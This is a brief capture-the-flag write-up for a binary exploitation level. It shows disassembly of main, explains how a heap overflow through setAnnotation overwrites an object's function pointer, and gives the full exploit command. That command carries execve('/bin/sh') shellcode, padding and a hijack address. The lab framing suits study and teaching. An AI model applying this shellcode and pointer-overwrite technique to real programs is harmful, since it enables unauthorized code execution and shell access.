# level 9

## asm

```
080485f4 <main>:
                        [...]
 804862e:	89 5c 24 1c          	mov    DWORD PTR [esp+0x1c],ebx
 8048632:	c7 04 24 6c 00 00 00 	mov    DWORD PTR [esp],0x6c
 8048639:	e8 f2 fe ff ff       	call   8048530 <_Znwj@plt>
 804863e:	89 c3                	mov    ebx,eax
                        [...]
 8048650:	89 5c 24 18          	mov    DWORD PTR [esp+0x18],ebx
                        [...]
 804865c:	8b 44 24 18          	mov    eax,DWORD PTR [esp+0x18]
 8048660:	89 44 24 10          	mov    DWORD PTR [esp+0x10],eax
                        [...]
 804867c:	8b 44 24 10          	mov    eax,DWORD PTR [esp+0x10]
 8048680:	8b 00                	mov    eax,DWORD PTR [eax]
 8048682:	8b 10                	mov    edx,DWORD PTR [eax]
                        [...]
 8048693:	ff d2                	call   edx
                        [...]
```

## goal:

By examining the assembly code we find out that a call is made to a pointer address pointed by the value stored at the begining of v4.
Using v6->setAnnotation we overwrite the pointer at the beginning of v4 with the address of v6 buffer. There we put the address of 4 char farther
where we put our shellcode.

## the hack:

./level9 $(perl -e 'print "\x10\xa0\x04\x08" . "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" . "A" x 80 . "\x0c\xa0\x04\x08"') ; cat
